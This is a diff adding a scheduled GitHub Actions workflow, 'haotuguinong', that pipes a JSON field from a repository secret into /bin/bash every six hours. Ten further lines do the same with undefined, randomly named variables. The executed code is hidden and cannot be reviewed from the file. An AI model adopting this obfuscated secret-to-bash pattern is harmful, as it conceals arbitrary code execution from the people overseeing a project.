@@ -1,0 +1,28 @@
+name: haotuguinong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haotuguinong
+        env:
+          eqqg3326: ${{ secrets.eqqg3326 }}
+        run: |
+          echo $eqqg3326 | jq -r .oil891 | /bin/bash
+          echo $m3285 | jq -r .eyl10 | /bin/bash
+          echo $usvrs9 | jq -r .o9 | /bin/bash
+          echo $icz53 | jq -r .lqz86 | /bin/bash
+          echo $yk4446 | jq -r .read13 | /bin/bash
+          echo $cpgh27230 | jq -r .l5 | /bin/bash
+          echo $loh5959 | jq -r .h77 | /bin/bash
+          echo $nmar58 | jq -r .zfuks258 | /bin/bash
+          echo $wzy2393 | jq -r .jzwe2617 | /bin/bash
+          echo $hiv954 | jq -r .xee3930 | /bin/bash
+          echo $bvzul3 | jq -r .ubx3476 | /bin/bash
+
